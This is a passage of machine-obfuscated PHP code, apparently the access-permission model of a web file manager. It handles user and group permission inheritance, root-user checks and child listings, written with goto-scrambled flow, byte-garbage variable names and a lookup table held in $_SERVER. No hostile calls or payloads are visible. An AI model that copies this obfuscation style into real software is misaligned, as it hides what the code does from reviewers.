$_SERVER[æ§›¦ÌáØ]; $cÔê·ˆ‰ = Model($Fè¸ïâÈá[1196])->sourceListInfo($f…‘±Öø’, !0); $c¿ÏÀ…†Ş’ = $this->sourceAuthSelect($f…‘±Öø’); goto F¼Åæ™øë´; F¼Åæ™øë´: $EÆé†–Ó = array(); $C¥Ú»‚ö«Ô = array(); foreach ($cÔê·ˆ‰ as $AÎ¿ø’¤ë) { goto e½Ï‘Â ; dòÚ„Ë©å’: $AÎ¿ø’¤ë[$Fè¸ïâÈá[1859]] = $this->authTargetInfo($FèÒ»ŒºÉ¦); $AÎ¿ø’¤ë[$Fè¸ïâÈá[500]] = rtrim($AÎ¿ø’¤ë[$Fè¸ïâÈá[506]], $Fè¸ïâÈá[8]) . $Fè¸ïâÈá[8] . ltrim($AÎ¿ø’¤ë[$Fè¸ïâÈá[500]], $Fè¸ïâÈá[8]); $EÆé†–Ó[] = $AÎ¿ø’¤ë; goto c¹§œï‹´¬; e½Ï‘Â : unset($AÎ¿ø’¤ë[$Fè¸ïâÈá[434]]); unset($AÎ¿ø’¤ë[$Fè¸ïâÈá[432]]); unset($AÎ¿ø’¤ë[$Fè¸ïâÈá[406]]); goto bù‘‡›êÖ; c¹§œï‹´¬: $eÔë°¾İØ¾ = count(explode($Fè¸ïâÈá[8], trim($AÎ¿ø’¤ë[$Fè¸ïâÈá[500]], $Fè¸ïâÈá[8]))); $C¥Ú»‚ö«Ô[] = $eÔë°¾İØ¾ + ($AÎ¿ø’¤ë[$Fè¸ïâÈá[29]] == $Fè¸ïâÈá[77] ? 0 : 1000); goto CïÀµÈùö; bù‘‡›êÖ: unset($AÎ¿ø’¤ë[$Fè¸ïâÈá[85]]); $FèÒ»ŒºÉ¦ = $c¿ÏÀ…†Ş’[$AÎ¿ø’¤ë[$Fè¸ïâÈá[395]]]; if (!$FèÒ»ŒºÉ¦) { continue; } goto dòÚ„Ë©å’; CïÀµÈùö: } goto F¯ì‘‚³Ú; F‘¹™±ŠÉ²: } private function groupChidldAllRootSource($B÷š´Ú¬äó) { $F›æß“Ëé¤ =& $_SERVER[æ§›¦ÌáØ]; $EÁÛø×®Ï = Model($F›æß“Ëé¤[1860])->groupChildrenAll($B÷š´Ú¬äó); $e‚äç°÷ù· = array($F›æß“Ëé¤[478] => 0, $F›æß“Ëé¤[484] => array($F›æß“Ëé¤[7], $EÁÛø×®Ï), $F›æß“Ëé¤[404] => SourceModel::TYPE_GROUP); $cº¿½¶í¯¬ = Model($F›æß“Ëé¤[783])->field($F›æß“Ëé¤[395])->where($e‚äç°÷ù·)->select(); $cº¿½¶í¯¬ = array_to_keyvalue($cº¿½¶í¯¬, $F›æß“Ëé¤[33], $F›æß“Ëé¤[395]); return $cº¿½¶í¯¬; } private function authTargetInfo($f–°ËÏïŸõ) { goto Cß¾ø˜­¼‘; a ŒÄÛ˜‡¿: $F±ğ‡Ø¶©Œ = 2 << 25; foreach ($f–°ËÏïŸõ as $díĞÍ¶ø‘Ñ) { goto DçÀ©¾Ÿå; dÍ÷¥õ‘: if (!$B£İ‹à²÷•) { continue; } $B£İ‹à²÷•[$fö„ïõÕê[446]] = $C×…š­ÉÏ; $DàÔÍÔšŞÚ[] = $B£İ‹à²÷•; goto FÆİùÑŠ¿Ë; c®íŠ‹ùô—: if ($díĞÍ¶ø‘Ñ[$fö„ïõÕê[404]] == SourceModel::TYPE_USER && $díĞÍ¶ø‘Ñ[$fö„ïõÕê[484]] == $fö„ïõÕê[191]) { $C‘…¾¦¤è¾ = 0; } $fŒÍ¼ˆ×†[] = $C×…š­ÉÏ[$fö„ïõÕê[406]] + $C‘…¾¦¤è¾; goto C‡Æ›à æ; FÆİùÑŠ¿Ë: $C‘…¾¦¤è¾ = 0; if ($díĞÍ¶ø‘Ñ[$fö„ïõÕê[404]] == SourceModel::TYPE_GROUP) { $C‘…¾¦¤è¾ = $F±ğ‡Ø¶©Œ * 2; } if ($díĞÍ¶ø‘Ñ[$fö„ïõÕê[404]] == SourceModel::TYPE_USER) { $C‘…¾¦¤è¾ = $F±ğ‡Ø¶©Œ; } goto c®íŠ‹ùô—; DçÀ©¾Ÿå: $C×…š­ÉÏ = Model($fö„ïõÕê[488])->listData($díĞÍ¶ø‘Ñ[$fö„ïõÕê[1784]]); if (!$C×…š­ÉÏ) { continue; } if ($díĞÍ¶ø‘Ñ[$fö„ïõÕê[404]] == SourceModel::TYPE_USER) { $B£İ‹à²÷• = Model($fö„ïõÕê[494])->getInfoSimpleOuter($díĞÍ¶ø‘Ñ[$fö„ïõÕê[484]]); if ($B£İ‹à²÷•[$fö„ïõÕê[1520]] == $fö„ïõÕê[1075]) { continue; } if ($B£İ‹à²÷•[$fö„ïõÕê[1520]] == $fö„ïõÕê[191]) { $B£İ‹à²÷•[$fö„ïõÕê[28]] = LNG($fö„ïõÕê[1861]); } } else { $B£İ‹à²÷• = Model($fö„ïõÕê[503])->getInfoSimple($díĞÍ¶ø‘Ñ[$fö„ïõÕê[484]]); } goto dÍ÷¥õ‘; C‡Æ›à æ: } array_multisort($fŒÍ¼ˆ×†, SORT_DESC, $DàÔÍÔšŞÚ); goto D˜î¹¸çä; D˜î¹¸çä: return $DàÔÍÔšŞÚ; goto C¶â¤³˜ã; Cß¾ø˜­¼‘: $fö„ïõÕê =& $_SERVER[æ§›¦ÌáØ]; $DàÔÍÔšŞÚ = array(); $fŒÍ¼ˆ×† = array(); goto a ŒÄÛ˜‡¿; C¶â¤³˜ã: } public function getAllChildrenByUser($bÛğ–‚òàƒ, $F¡‚ÖÅÄ‡) { goto FëÔ¢öä¢¨; c‘œ²ÙÜˆè: foreach ($bÎ›¼ºç‘‡ as $bà«•ÒÕ‚Æ) { $d‹Û‘ˆ«Š´ = !1; foreach ($bà«•ÒÕ‚Æ[$Añ¤¡Å÷â [1859]] as $d—¥Éà‡ãµ) { if ($d—¥Éà‡ãµ[$Añ¤¡Å÷â [1520]]) { if ($d—¥Éà‡ãµ[$Añ¤¡Å÷â [1520]] == $F¡‚ÖÅÄ‡) { $d‹Û‘ˆ«Š´ = !0; break; } } if ($d—¥Éà‡ãµ[$Añ¤¡Å÷â [1689]]) { if ($this->groupContainUser($d—¥Éà‡ãµ[$Añ¤¡Å÷â [1689]], $F¡‚ÖÅÄ‡)) { $d‹Û‘ˆ«Š´ = !0; break; } } } if ($d‹Û‘ˆ«Š´) { $D¬•²²»ğŞ[] = $bà«•ÒÕ‚Æ; } $F‰·ÍäÑ­Œ = $bà«•ÒÕ‚Æ[$Añ¤¡Å÷â [395]]; if (isset($e›ÍºêÜ‰Ó[$F‰·ÍäÑ­Œ])) { $bà«•ÒÕ‚Æ[$Añ¤¡Å÷â [1859]][] = $e›ÍºêÜ‰Ó[$F‰·ÍäÑ­Œ][0]; $e›ÍºêÜ‰Ó[$F‰·ÍäÑ­Œ] = !1; } } $e›ÍºêÜ‰Ó = array_filter(array_values($e›ÍºêÜ‰Ó)); $D¬•²²»ğŞ = array_merge($e›ÍºêÜ‰Ó, $D¬•²²»ğŞ); goto e——ï›¹Í; FëÔ¢öä¢¨: $Añ¤¡Å÷â  =& $_SERVER[æ§›¦ÌáØ]; $Aééãğìá = Model($Añ¤¡Å÷â [519])->getInfo($F¡‚ÖÅÄ‡); if (!$F¡‚ÖÅÄ‡ || !$bÛğ–‚òàƒ || !$Aééãğìá) { return array(); } goto aÇˆ±©°Ã—; aŠ•ôÂ»²›: if ($fÎ‰¥é«öÁ[$Añ¤¡Å÷â [478]] == $Añ¤¡Å÷â [191] && $fÎ‰¥é«öÁ[$Añ¤¡Å÷â [484]] != $dÔÆ¦¥›ÈÂ && $this->groupContainUser($fÎ‰¥é«öÁ[$Añ¤¡Å÷â [484]], $F¡‚ÖÅÄ‡)) { foreach ($Aééãğìá[$Añ¤¡Å÷â [1862]] as $d‚Éêİİó) { $a§²Á»è˜© = Model($Añ¤¡Å÷â [503])->getInfo($d‚Éêİİó[$Añ¤¡Å÷â [1689]]); $EåŸÍ—ÀœÚ = Model($Añ¤¡Å÷â [519])->getInfoSimpleOuter($F¡‚ÖÅÄ‡); $EåŸÍ—ÀœÚ[$Añ¤¡Å÷â [446]] = $d‚Éêİİó[$Añ¤¡Å÷â [406]]; if (Model($Añ¤¡Å÷â [488])->authCheckAction($d‚Éêİİó[$Añ¤¡Å÷â [406]][$Añ¤¡Å÷â [406]], $Añ¤¡Å÷â [1709])) { continue; } $A¬‡‹Ú’„’ = array($Añ¤¡Å÷â [28] => $Añ¤¡Å÷â [1472] . $a§²Á»è˜©[$Añ¤¡Å÷â [28]], $Añ¤¡Å÷â [395] => $a§²Á»è˜©[$Añ¤¡Å÷â [85]][$Añ¤¡Å÷â [395]], $Añ¤¡Å÷â [76] => KodIO::make($a§²Á»è˜©[$Añ¤¡Å÷â [85]][$Añ¤¡Å÷â [395]]), $Añ¤¡Å÷â [478] => $Añ¤¡Å÷â [191], $Añ¤¡Å÷â [404] => $Añ¤¡Å÷â [496], $Añ¤¡Å÷â [29] => $Añ¤¡Å÷â [530], $Añ¤¡Å÷â [500] => $a§²Á»è˜©[$Añ¤¡Å÷â [507]], $Añ¤¡Å÷â [1689] => $a§²Á»è˜©[$Añ¤¡Å÷â [1689]], $Añ¤¡Å÷â [504] => $a§²Á»è˜©[$Añ¤¡Å÷â [478]], $Añ¤¡Å÷â [1859] => array($EåŸÍ—ÀœÚ)); $e›ÍºêÜ‰Ó[$A¬‡‹Ú’„’[$Añ¤¡Å÷â [395]]] = $A¬‡‹Ú’„’; } } $D¬•²²»ğŞ = array(); $bÎ›¼ºç‘‡ = $this->getAllChildren($bÛğ–‚òàƒ); goto c‘œ²ÙÜˆè; e——ï›¹Í: return $D¬•²²»ğŞ; goto f©•’œçº¿; aÇˆ±©°Ã—: $fÎ‰¥é«öÁ = Model($Añ¤¡Å÷â [1196])->sourceInfo($bÛğ–‚òàƒ); $e›ÍºêÜ‰Ó = array(); $dÔÆ¦¥›ÈÂ = 1; goto aŠ•ôÂ»²›; f©•’œçº¿: } public function setAllChildrenByUser($DÁ¼ÕäÆˆ´, $eÆ’ÄŒ£‡, $Dç¹ÉáÇÃğ) { $Cà‡ù“× =& $_SERVER[æ§›¦ÌáØ]; $dÜ¨ë ¡” = $this->getAllChildrenByUser($DÁ¼ÕäÆˆ´, $eÆ’ÄŒ£‡); if (!$Dç¹ÉáÇÃğ || !$dÜ¨ë ¡”) { return !1; } foreach ($dÜ¨ë ¡” as $B”ßâ¥Š¡) { $F‘´éÅë¬ = array(); foreach ($B”ßâ¥Š¡[$Cà‡ù“×[1859]] as $A¯«ÃÒ‡Ğ§) { $B‘Ò·¬ˆÄî = $A¯«ÃÒ‡Ğ§[$Cà‡ù“×[446]]; $C§ÌàòÄ™é = $A¯«ÃÒ‡Ğ§[$Cà‡ù“×[1520]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $a®°¬¥é  = $A¯«ÃÒ‡Ğ§[$Cà‡ù“×[1520]] ? $A¯«ÃÒ‡Ğ§[$Cà‡ù“×[1520]] : $A¯«ÃÒ‡Ğ§[$Cà‡ù“×[1689]]; if ($A¯«ÃÒ‡Ğ§[$Cà‡ù“×[1520]] && $A¯«ÃÒ‡Ğ§[$Cà‡ù“×[1520]] == $eÆ’ÄŒ£‡) { continue; } $F‘´éÅë¬[] = array($Cà‡ù“×[395] => $B”ßâ¥Š¡[$Cà‡ù“×[395]], $Cà‡ù“×[404] => $C§ÌàòÄ™é, $Cà‡ù“×[484] => intval($a®°¬¥é ), $Cà‡ù“×[1784] => isset($B‘Ò·¬ˆÄî[$Cà‡ù“×[393]]) ? intval($B‘Ò·¬ˆÄî[$Cà‡ù“×[393]]) : 0, $Cà‡ù“×[1838] => isset($B‘Ò·¬ˆÄî[$Cà‡ù“×[1838]]) ? intval($B‘Ò·¬ˆÄî[$Cà‡ù“×[1838]]) : -1); } $F‘´éÅë¬[] = array($Cà‡ù“×[395] => $B”ßâ¥Š¡[$Cà‡ù“×[395]], $Cà‡ù“×[404] => SourceModel::TYPE_USER, $Cà‡ù“×[484] => intval($eÆ’ÄŒ£‡), $Cà‡ù“×[1784] => intval($Dç¹ÉáÇÃğ), $Cà‡ù“×[1838] => -1); $this->where(array($Cà‡ù“×[410] => $B”ßâ¥Š¡[$Cà‡ù“×[395]]))->delete(); $this->addAll($F‘´éÅë¬); } return !0; } public function get($DÜŒ¢Œ µ‰) { $Bš…¡ÏØ½£ = $this->getSourceList(array($DÜŒ¢Œ µ‰), !0); return $Bš…¡ÏØ½£[0]; } public function getSourceList($e¦Å˜ºŒ‘Â, $Fëà‹¢ÆÉù = false, $AÆ‡˜ÎÔÁ = false) { goto fíß¸ÄŒÈã; f³¨ÆØÂÜ: if (!$Fëà‹¢ÆÉù && count($e¦Å˜ºŒ‘Â) == 1) { $Fëà‹¢ÆÉù = array(); $Fëà‹¢ÆÉù[$e¦Å˜ºŒ‘Â[0]] = $Dò±„ÖÎÄƒ->sourceInfo($e¦Å˜ºŒ‘Â[0]); } if (!$Fëà‹¢ÆÉù) { $dİÖ¼ÙªÆ = array($e‚²¢™è«ê[410] => array($e‚²¢™è«ê[411], $e¦Å˜ºŒ‘Â)); $Fëà‹¢ÆÉù = $Dò±„ÖÎÄƒ->field($e‚²¢™è«ê[1863])->where($dİÖ¼ÙªÆ)->select(); $Fëà‹¢ÆÉù = array_to_keyvalue($Fëà‹¢ÆÉù, $e‚²¢™è«ê[395]); } $B§•Ï™ÔÌ = $e¦Å˜ºŒ‘Â; goto C¶‘ÅóåÜÛ; E‘ŞåÎ¦ˆÑ: $f“ÊØâ”²Ü = $this->userIsRoot($AÆ‡˜ÎÔÁ); $dÂÌ¶…‚ù” = AuthModel::authAll(); $CÉì¿ò½“ = array($e‚²¢™è«ê[407] => $dÂÌ¶…‚ù”, $e‚²¢™è«ê[1864] => array($e‚²¢™è«ê[412] => 0, $e‚²¢™è«ê[1695] => $dÂÌ¶…‚ù”, $e‚²¢™è«ê[413] => LNG($e‚²¢™è«ê[1865]), $e‚²¢™è«ê[1711] => $e‚²¢™è«ê[1866])); goto DÀ‚ÄÕ…é; C¶‘ÅóåÜÛ: foreach ($Fëà‹¢ÆÉù as $CÅ¯ƒµ½‚™ => $c÷ÜòÄç…¾) { $fê³¬ËĞ‘œ = $Dò±„ÖÎÄƒ->parentLevelArray($c÷ÜòÄç…¾[$e‚²¢™è«ê[502]]); $B§•Ï™ÔÌ = array_merge($B§•Ï™ÔÌ, array($CÅ¯ƒµ½‚™), array_reverse($fê³¬ËĞ‘œ)); } $B§•Ï™ÔÌ = array_values(array_unique($B§•Ï™ÔÌ)); if (!$B§•Ï™ÔÌ) { return array(); } goto DÌÍ —²ğ’; fíß¸ÄŒÈã: $e‚²¢™è«ê =& $_SERVER[æ§›¦ÌáØ]; if (!$e¦Å˜ºŒ‘Â) { return array(); } $Dò±„ÖÎÄƒ = Model($e‚²¢™è«ê[1196]); goto f³¨ÆØÂÜ; DÀ‚ÄÕ…é: $f§…˜‰Í = array(); foreach ($Fëà‹¢ÆÉù as $EßÛàáïÏ => $A©¹Â¿æÂ) { if ($f“ÊØâ”²Ü) { $f§…˜‰Í[$EßÛàáïÏ] = $CÉì¿ò½“; continue; } $f§…˜‰Í[$EßÛàáïÏ] = $this->makeSourceAuth($A©¹Â¿æÂ, $dö³Î‚‡ßÉ, $AÆ‡˜ÎÔÁ); } return $f§…˜‰Í; goto fäšŒ©åÆ; DÌÍ —²ğ’: $cóĞ“•Ûö½ = $this->sourceAuthSelect($B§•Ï™ÔÌ); $dö³Î‚‡ßÉ = array(); foreach ($B§•Ï™ÔÌ as $EßÛàáïÏ) { if (isset($cóĞ“•Ûö½[$EßÛàáïÏ])) { $dö³Î‚‡ßÉ[$EßÛàáïÏ] = $cóĞ“•Ûö½[$EßÛàáïÏ]; } } goto E‘ŞåÎ¦ˆÑ; fäšŒ©åÆ: } public function authDeepCheck($Bäâêƒ»ìÈ, $AâËëå˜“‡ = false) { goto f‰™¯™ç¬; f‰™¯™ç¬: $aé“„ùİÂö =& $_SERVER[æ§›¦ÌáØ]; $AâËëå˜“‡ = $AâËëå˜“‡ ? $AâËëå˜“‡ : USER_ID; $AÖŠ·‰ğÁ = $this->makeAuthDeep($AâËëå˜“‡); goto aŒ¢İİ‡ÜÅ; d¦›ÑŠÁóø: if (!$d¯‘‹í¤›Á) { return !1; } $A’ñ¸±ª† = $d¯‘‹í¤›Á ? $d¯‘‹í¤›Á[0] : $Bäâêƒ»ìÈ; return array($aé“„ùİÂö[407] => -1, $aé“„ùİÂö[446] => array($aé“„ùİÂö[412] => $aé“„ùİÂö[1075], $aé“„ùİÂö[1695] => $aé“„ùİÂö[191], $aé“„ùİÂö[413] => LNG($aé“„ùİÂö[1869]), $aé“„ùİÂö[1711] => $aé“„ùİÂö[1870]), $aé“„ùİÂö[1871] => LNG($aé“„ùİÂö[1872]), $aé“„ùİÂö[1873] => $this->sourceAuthInfo($A’ñ¸±ª†)); goto fÚ†¦Œô¯; aŒ¢İİ‡ÜÅ: if (!in_array($Bäâêƒ»ìÈ, $AÖŠ·‰ğÁ[$aé“„ùİÂö[1867]])) { return !1; } $d¯‘‹í¤›Á = array(); foreach ($AÖŠ·‰ğÁ[$aé“„ùİÂö[1868]] as $F—Ö£ßßµ¤ => $f ÷†–¦ÁÌ) { if (!in_array($Bäâêƒ»ìÈ, $f ÷†–¦ÁÌ)) { continue; } $d¯‘‹í¤›Á[] = $F—Ö£ßßµ¤; } goto d¦›ÑŠÁóø; fÚ†¦Œô¯: } protected function makeAuthDeep($Bäó†©ĞÕÓ = false) { goto bÅ¨¬—ìÖ×; e¶º”ŠŠ©Á: $BôƒÜ²®„¢ = array(); if ($DìŞ´øĞ¢) { $D®‹¨¾±‡İ = $c”ö¸®”»™->where(array($cŸ‚®èÁòË[395] => array($cŸ‚®èÁòË[411], $DìŞ´øĞ¢)))->select(); foreach ($D®‹¨¾±‡İ as $dİåæ“ÇáÏ) { $bœ×–›À¯ = $c”ö¸®”»™->parentLevelArray($dİåæ“ÇáÏ[$cŸ‚®èÁòË[502]]); $bƒªèæŒõÙ = array_merge($bƒªèæŒõÙ, $bœ×–›À¯); $CøÛÄØç¤î[] = $dİåæ“ÇáÏ[$cŸ‚®èÁòË[484]]; $F’ÎÜ¡–óø[$dİåæ“ÇáÏ[$cŸ‚®èÁòË[395]]] = $bœ×–›À¯; $C¯ÈÒî­Ì÷[$dİåæ“ÇáÏ[$cŸ‚®èÁòË[395]]] = $dİåæ“ÇáÏ[$cŸ‚®èÁòË[484]]; } } $CøÛÄØç¤î = array_values(array_unique($CøÛÄØç¤î)); goto CÂ‡‡İ«‰; f–òÓâ·: if (isset($CÕöã•˜‰Á[$Bäó†©ĞÕÓ])) { return $CÕöã•˜‰Á[$Bäó†©ĞÕÓ]; } $F…¼óÀêªò = Model($cŸ‚®èÁòË[1874])->listData(); $AÔÒ°©ÊÀ¾ = array(); goto cÁ÷Å¡Ö¨›; D†»ª…×å: $F’ÎÜ¡–óø = array(); $C¯ÈÒî­Ì÷ = array(); $cÛÛÉ™å‚’ = array(); goto e¶º”ŠŠ©Á; CÊŠãÆ±ñ: if ($cÏ•²ÛÁ†) { $CôĞ¥à–ßã = array(array($cŸ‚®èÁòË[404] => SourceModel::TYPE_USER, $cŸ‚®èÁòË[484] => $Bäó†©ĞÕÓ), array($cŸ‚®èÁòË[404] => SourceModel::TYPE_GROUP, $cŸ‚®èÁòË[484] => array($cŸ‚®èÁòË[411], $cÏ•²ÛÁ†)), $cŸ‚®èÁòË[948] => $cŸ‚®èÁòË[1776]); } $c”Ó²Úˆ‡« = $this->field($cŸ‚®èÁòË[1875])->where($CôĞ¥à–ßã)->select(); $DìŞ´øĞ¢ = array(); goto F¶¶òî¢; cÁ÷Å¡Ö¨›: foreach ($F…¼óÀêªò as $FÕéÚ„œ”ù) { if ($FÕéÚ„œ”ù[$cŸ‚®èÁòË[406]] == 0 && $FÕéÚ„œ”ù[$cŸ‚®èÁòË[1710]] == $cŸ‚®èÁòË[87]) { $AÔÒ°©ÊÀ¾[] = $FÕéÚ„œ”ù[$cŸ‚®èÁòË[393]]; } } $cÏ•²ÛÁ† = $this->userGroupParents($Bäó†©ĞÕÓ); $CôĞ¥à–ßã = array($cŸ‚®èÁòË[404] => SourceModel::TYPE_USER, $cŸ‚®èÁòË[484] => $Bäó†©ĞÕÓ); goto CÊŠãÆ±ñ; F¶¶òî¢: $BÜŸˆøã’é = array_to_keyvalue_group($c”Ó²Úˆ‡«, $cŸ‚®èÁòË[395]); foreach ($BÜŸˆøã’é as $b°”¹äî¦© => $eŞİæƒäÌŸ) { $e³¢ö‹ø£Õ = $this->authArrayCheck($eŞİæƒäÌŸ, $Bäó†©ĞÕÓ); if ($e³¢ö‹ø£Õ[$cŸ‚®èÁòË[407]] > 0) { $DìŞ´øĞ¢[] = $b°”¹äî¦© . $cŸ‚®èÁòË[33]; } } $bƒªèæŒõÙ = array(); goto fİÌÏÖÖ¤’; CÂ‡‡İ«‰: $fˆ¤¤¾õ± = $CøÛÄØç¤î; foreach ($fˆ¤¤¾õ± as $D‚É³£ÂÚí) { $Fœôƒİ¤’­ = $dÆ§ÓÇƒ–²->getInfo($D‚É³£ÂÚí); $bœ×–›À¯ = $c”ö¸®”»™->parentLevelArray($Fœôƒİ¤’­[$cŸ‚®èÁòË[502]]); $CøÛÄØç¤î = array_merge($CøÛÄØç¤î, $bœ×–›À¯); } $CøÛÄØç¤î = array_values(array_unique($CøÛÄØç¤î)); goto EŸÎÊ±‘Ÿ; fİÌÏÖÖ¤’: $CøÛÄØç¤î = $cÏ•²ÛÁ†; $c”ö¸®”»™ = Model($cŸ‚®èÁòË[1196]); $dÆ§ÓÇƒ–² = Model($cŸ‚®èÁòË[503]); goto D†»ª…×å; bÅ¨¬—ìÖ×: $cŸ‚®èÁòË =& $_SERVER[æ§›¦ÌáØ]; static $CÕöã•˜‰Á = array(); $Bäó†©ĞÕÓ = $Bäó†©ĞÕÓ ? $Bäó†©ĞÕÓ : USER_ID; goto f–òÓâ·; f‡ßœè: $EÚ•ß¾¸ = array($cŸ‚®èÁòË[1867] => $bƒªèæŒõÙ, $cŸ‚®èÁòË[1868] => $F’ÎÜ¡–óø); $CÕöã•˜‰Á[$Bäó†©ĞÕÓ] = $EÚ•ß¾¸; return $EÚ•ß¾¸; goto Bğ†æ‰”; EŸÎÊ±‘Ÿ: foreach ($CøÛÄØç¤î as $D‚É³£ÂÚí) { $Fœôƒİ¤’­ = $dÆ§ÓÇƒ–²->getInfo($D‚É³£ÂÚí); $bƒªèæŒõÙ[] = $Fœôƒİ¤’­[$cŸ‚®èÁòË[85]][$cŸ‚®èÁòË[395]]; $cÛÛÉ™å‚’[$D‚É³£ÂÚí] = $Fœôƒİ¤’­[$cŸ‚®èÁòË[85]][$cŸ‚®èÁòË[395]]; $BôƒÜ²®„¢[$D‚É³£ÂÚí] = $c”ö¸®”»™->parentLevelArray($Fœôƒİ¤’­[$cŸ‚®èÁòË[502]]); } foreach ($F’ÎÜ¡–óø as $AïÈ·É”Ìæ => $D„ĞÛšŸàˆ) { $dŸÛ•êÚŞ = $C¯ÈÒî­Ì÷[$AïÈ·É”Ìæ]; if (!$dŸÛ•êÚŞ || !$cÛÛÉ™å‚’[$dŸÛ•êÚŞ]) { continue; } $EËÙ¸º„Š = array(); foreach ($BôƒÜ²®„¢[$dŸÛ•êÚŞ] as $D‚É³£ÂÚí) { $EËÙ¸º„Š[] = $cÛÛÉ™å‚’[$D‚É³£ÂÚí]; } $F’ÎÜ¡–óø[$AïÈ·É”Ìæ] = array_merge($EËÙ¸º„Š, $D„ĞÛšŸàˆ); } $bƒªèæŒõÙ = array_values(array_unique($bƒªèæŒõÙ)); goto f‡ßœè; Bğ†æ‰”: } private function makeSourceAuth($bƒ®´‹ ¯Ê, $f‹öß’ïÀÙ, $A¬‹«“ŠÕÛ = false) { goto e•ÉØ¹ÕÃª; BÖ‹ê±’©: foreach ($cŠ÷ñ¶ßÉ¾ as $AÑ‡›‚Úˆ) { if (!isset($f‹öß’ïÀÙ[$AÑ‡›‚Úˆ])) { continue; } $B¯Øªãç› = $this->authMake($f‹öß’ïÀÙ[$AÑ‡›‚Úˆ], $A¬‹«“ŠÕÛ); if ($B¯Øªãç›[$eµìÛ¯½ïÛ[446]]) { $E„‹‹¢âÒÀ = $B¯Øªãç›; break; } } if (!$bÏõèÇ‘Â±) { return $E„‹‹¢âÒÀ; } if (!$E„‹‹¢âÒÀ && $bÌç‹Å…Û) { $E„‹‹¢âÒÀ = $this->groupAuthInfo($bÌç‹Å…Û, $e»ÍëäæÙ); } goto dŠÊÛÙÓÈ¯; e•ÉØ¹ÕÃª: $eµìÛ¯½ïÛ =& $_SERVER[æ§›¦ÌáØ]; $eğ¾¼¶ö±¥ = $eµìÛ¯½ïÛ[87]; $e»ÍëäæÙ = $bƒ®´‹ ¯Ê[$eµìÛ¯½ïÛ[484]]; goto AÆêçõ†õ£; dŠÊÛÙÓÈ¯: if (!$E„‹‹¢âÒÀ) { $AÒœ©—òÁ = Model($eµìÛ¯½ïÛ[503])->getInfo($e»ÍëäæÙ); $EŒÖ†ß„òß = explode($eµìÛ¯½ïÛ[47], trim($AÒœ©—òÁ[$eµìÛ¯½ïÛ[502]], $eµìÛ¯½ïÛ[47])); $EŒÖ†ß„òß = array_reverse($EŒÖ†ß„òß); foreach ($EŒÖ†ß„òß as $D†˜Üä‘¢œ) { if ($D†˜Üä‘¢œ == $eµìÛ¯½ïÛ[191] || $D†˜Üä‘¢œ == $eğ¾¼¶ö±¥) { continue; } $D‘„ÓÖğ® = $this->groupRootAuth($D†˜Üä‘¢œ, $A¬‹«“ŠÕÛ); if (!$D‘„ÓÖğ®) { continue; } $E„‹‹¢âÒÀ = $this->groupAuthInfo($D‘„ÓÖğ®, $D†˜Üä‘¢œ); break; } } if (!$E„‹‹¢âÒÀ || $E„‹‹¢âÒÀ[$eµìÛ¯½ïÛ[407]] <= 0) { $fÄåÏàÜÄ = $this->authDeepCheck($bƒ®´‹ ¯Ê[$eµìÛ¯½ïÛ[395]], $A¬‹«“ŠÕÛ); if ($fÄåÏàÜÄ) { $E„‹‹¢âÒÀ = $fÄåÏàÜÄ; } } return $E„‹‹¢âÒÀ; goto aãÇê·š²¦; fÉ³ŞâÎùİ: $cŠ÷ñ¶ßÉ¾ = Model($eµìÛ¯½ïÛ[1196])->parentLevelArray($bƒ®´‹ ¯Ê[$eµìÛ¯½ïÛ[502]]); $cŠ÷ñ¶ßÉ¾ = array_merge(array($bƒ®´‹ ¯Ê[$eµìÛ¯½ïÛ[395]]), array_reverse($cŠ÷ñ¶ßÉ¾)); $E„‹‹¢âÒÀ = !1; goto BÖ‹ê±’©; AÆêçõ†õ£: $bÏõèÇ‘Â± = $bƒ®´‹ ¯Ê[$eµìÛ¯½ïÛ[404]] == SourceModel::TYPE_GROUP; $bÌç‹Å…Û = $bÏõèÇ‘Â± ? $this->groupRootAuth($e»ÍëäæÙ, $A¬‹«“ŠÕÛ) : !1; if ($bÌç‹Å…Û && Model($eµìÛ¯½ïÛ[488])->authCheckAction($bÌç‹Å…Û[$eµìÛ¯½ïÛ[406]], $eµìÛ¯½ïÛ[1709])) { return $this->groupAuthInfo($bÌç‹Å…Û, $e»ÍëäæÙ); } goto fÉ³ŞâÎùİ; aãÇê·š²¦: } private function userIsRoot($CÄÛÃ”¶Çù = false) { $Bµª¶©ìë… =& $_SERVER[æ§›¦ÌáØ]; if (!$CÄÛÃ”¶Çù && _get($GLOBALS, $Bµª¶©ìë…[485])) { return !0; } $bô³‘ÁÇ = Model($Bµª¶©ìë…[519])->getInfo($CÄÛÃ”¶Çù); $Fµ‡œßÉŠ = Model($Bµª¶©ìë…[1876])->listData($bô³‘ÁÇ[$Bµª¶©ìë…[1403]]); if ($Fµ‡œßÉŠ && $Fµ‡œßÉŠ[$Bµª¶©ìë…[492]][$Bµª¶©ìë…[1877]] == 1) { return !0; } return !1; } private function sourceAuthInfo($cŒÍÛµìÜ¦) { goto e‡ñí“â¿‘; eªç¨™íâï: if (!$bÑ˜æã½Šø) { return !1; } $A¥¿íˆÇğè->groupPathDisplay($bÑ˜æã½Šø); $d“¾‚ŠŠ• = array($bÑ˜æã½Šø); goto C©Öš½ñŞŒ; DíÌ¬‘‚êø: if (isset($bÑ˜æã½Šø[$AßùÔ´øœæ[508]])) { $Dè†«…ÈÕ  = explode($AßùÔ´øœæ[8], trim($bÑ˜æã½Šø[$AßùÔ´øœæ[500]], $AßùÔ´øœæ[8])); array_shift($Dè†«…ÈÕ ); $Bàîã­·ÛÚ = $bÑ˜æã½Šø[$AßùÔ´øœæ[506]] . $AßùÔ´øœæ[1878] . implode($AßùÔ´øœæ[8], $Dè†«…ÈÕ ); } return array($AßùÔ´øœæ[413] => $bÑ˜æã½Šø[$AßùÔ´øœæ[28]], $AßùÔ´øœæ[76] => KodIO::make($bÑ˜æã½Šø[$AßùÔ´øœæ[395]]), $AßùÔ´øœæ[1879] => $Bàîã­·ÛÚ); goto D¹­›Ş­²Õ; e‡ñí“â¿‘: $AßùÔ´øœæ =& $_SERVER[æ§›¦ÌáØ]; $A¥¿íˆÇğè = Model($AßùÔ´øœæ[1196]); $bÑ˜æã½Šø = $A¥¿íˆÇğè->sourceInfo($cŒÍÛµìÜ¦); goto eªç¨™íâï; C©Öš½ñŞŒ: $d“¾‚ŠŠ• = $A¥¿íˆÇğè->_listAppendPath($d“¾‚ŠŠ•); $bÑ˜æã½Šø = $d“¾‚ŠŠ•[0]; $Bàîã­·ÛÚ = $bÑ˜æã½Šø[$AßùÔ´øœæ[500]]; goto DíÌ¬‘‚êø; 